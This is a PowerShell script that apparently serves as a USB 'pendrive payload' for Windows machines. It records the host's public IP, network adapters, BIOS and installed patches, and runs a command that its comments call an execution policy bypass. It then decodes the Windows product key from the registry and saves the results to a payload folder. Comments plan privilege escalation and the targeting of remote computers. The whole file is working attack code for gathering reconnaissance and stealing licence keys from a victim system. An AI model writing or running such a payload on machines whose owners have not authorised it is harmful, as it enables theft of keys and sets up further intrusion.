
  #Get-Service napagent | Stop-Service 
  # This well be implemented later, once I have consistent priv esc

  # Write-Host "Attempting to get public IP of this host"
   
    # I am defining website url in a variable 
    $url = "http://checkip.dyndns.com"  
     
    $webclient = New-Object System.Net.WebClient 
     
    $Ip = $webclient.DownloadString($url) 

    $Ip2 = $Ip.ToString() 
    $ip3 = $Ip2.Split(" ") 
    $ip4 = $ip3[5] 
    $ip5 = $ip4.replace("</body>","") 
    $FinalIPAddress = $ip5.replace("</html>","") 
 
 
    $FinalIPAddress | Out-File -filepath C:\Users\"user"\Desktop\Pendrive_Payload\PublicIP.txt

# Write-Host "Getting system information from WMI"

Get-NetAdapter | Out-File -filepath C:\Users\"user"\Desktop\Pendrive_Payload\NIC.txt

Get-WmiObject Win32_BIOS | Out-File -filepath C:\Users\"user"\Desktop\Pendrive_Payload\bios.txt

Get-WmiObject Win32_QuickFixEngineering | Out-File -filepath C:\Users\"user"\Desktop\Pendrive_Payload\quickfixpatchinfo.txt
 

# Write-Host "Checking to see if product key is valid"

$licResult = Get-WmiObject `
-Query "Select * FROM SoftwareLicensingProduct WHERE LicenseStatus
= 1"
$licResult.Name

## Trying a basic execution rights bypass
## This is not consisted cross platform at the moment, only works on some builds of windows 8

# Write-Host "attempting execution policy bypass"

#Write-Host "Attempting to dump key from local system" 

Echo Write-Host Set-ExecutionPolicy RemoteSigned  | PowerShell.exe -noprofile -

Get-ExecutionPolicy -List | Format-Table -AutoSize | Out-Null

$Host | Format-List

# targeting is on todo list
# $computer = read-host "Enter computer name here"

$computer = "."
Get-WMIObject Win32_OperatingSystem -ComputerName $computer | Out-Null
select-object Description,
Caption,OSArchitecture,
ServicePackMajorVersion

gcim Win32_OperatingSystem | fl * 

function Get-WindowsKey {
   
    param ($targets = ".")
    $hklm = 2147483650
    $regPath = "Software\Microsoft\Windows NT\CurrentVersion"
    $regValue = "DigitalProductId"
    Foreach ($target in $targets) {
        $productKey = $null
        $win32os = $null
        $wmi = [WMIClass]"\\$target\root\default:stdRegProv"
        $data = $wmi.GetBinaryValue($hklm,$regPath,$regValue)
        $binArray = ($data.uValue)[52..66]
        $charsArray = "B","C","D","F","G","H","J","K","M","P","Q","R","T","V","W","X","Y","2","3","4","6","7","8","9"
        ## decrypt base24 encoded binary data
        For ($i = 24; $i -ge 0; $i--) {
            $k = 0
            For ($j = 14; $j -ge 0; $j--) {
                $k = $k * 256 -bxor $binArray[$j]
                $binArray[$j] = [math]::truncate($k / 24)
                $k = $k % 24
            }
            $productKey = $charsArray[$k] + $productKey
            If (($i % 5 -eq 0) -and ($i -ne 0)) {
                $productKey = "-" + $productKey
            }
        }
        $win32os = Get-WmiObject Win32_OperatingSystem -computer $target
        $obj = New-Object Object
        $obj | Add-Member Noteproperty Computer -value $target
        $obj | Add-Member Noteproperty Caption -value $win32os.Caption
        $obj | Add-Member Noteproperty CSDVersion -value $win32os.CSDVersion
        $obj | Add-Member Noteproperty OSArch -value $win32os.OSArchitecture
        $obj | Add-Member Noteproperty BuildNumber -value $win32os.BuildNumber
        $obj | Add-Member Noteproperty RegisteredTo -value $win32os.RegisteredUser
        $obj | Add-Member Noteproperty ProductID -value $win32os.SerialNumber
        $obj | Add-Member Noteproperty ProductKey -value $productkey
        $obj
    }
}


New-Item C:\Users\"user"\Desktop\Pendrive_Payload\results.txt -type file


Get-WindowsKey | Out-File -filepath C:\Users\"user"\Desktop\Pendrive_Payload\results.txt
